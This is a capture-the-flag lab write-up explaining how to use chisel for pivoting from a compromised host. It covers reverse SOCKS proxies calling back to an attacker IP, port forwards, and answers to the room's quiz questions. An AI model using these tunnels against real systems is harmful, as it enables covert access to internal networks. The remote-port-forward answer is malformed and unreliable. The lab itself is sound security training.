**TASK 14: Chisel**

Instead of going through the git file mentioned in the descp of the task file just go the terminal and type
`chisel` in it..

![fdfaff](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/35a2c3a9-410a-4677-bac3-eacbd9fd5b7a)

And then check the version of the chisel by using `chisel` command again 

![Screenshot_2023-08-04_04_20_58](https://github.com/Anirudh-Saxena/Wreath-Writeup-THM/assets/73027020/12e13a6f-e653-4a54-9042-c5ac4d9469e9)

In order to access the help page simply type `chisel [command] --help

For example : `chisel server --help`

After this we will be creating 
- Reverse SOCKS Proxy
- Forward SOCKS Proxy
- Proxychains Reminder
- Remote Port Forward
- Local Port Forward


# Reverse SOCKS Proxy:
    ./chisel server -p LISTEN_PORT --reverse &
Can be done using this command, make sure to replace the `./chisel` with the server name that you donwloaded with..

On the compromised host, we would use the following command:

    ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &

Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on 127.0.0.1:1080. As such, we will be using port 1080 when sending data through the proxy.

Note the use of R:socks in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode.


# Forward SOCKS Proxy:

Run this on compromised host 

    ./chisel server -p LISTEN_PORT --socks5

And then run this on your Local machine to establish the connection between local host and the machine 

    ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks

For example, `./chisel client 172.16.0.10:8080 1337:socks` would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.


# Remote Port forwad:

A remote port forward is when we connect back from a compromised target to create the forward.

For a remote port forward, on our attacking machine we use the exact same command as before:

    ./chisel server -p LISTEN_PORT --reverse &

Once again this sets up a chisel listener for the compromised host to connect back to.
The command to connect back will be different i.e:

      ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &

The request is quite similar to that of the SSH reverse port...

# Local Port Forward:

As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.

Like we tried the connection with the private key `id_rsa` in the task 6

**Q. What command would you use to start a chisel server for a reverse connection on your attacking machine?
Use port 4242 for the listener and do not background the process.**

Ans: `./chisel server -p 4242 --reverse`

**Q. What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?**

Ans: `./chisel client 172.16.0.200:4242 R:socks &`

**Q. How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.**

    ./chisel client 172.16.0.100:3306 33060:172.16.0.200:1337 R:socks &

**Q. If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?**

    ./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
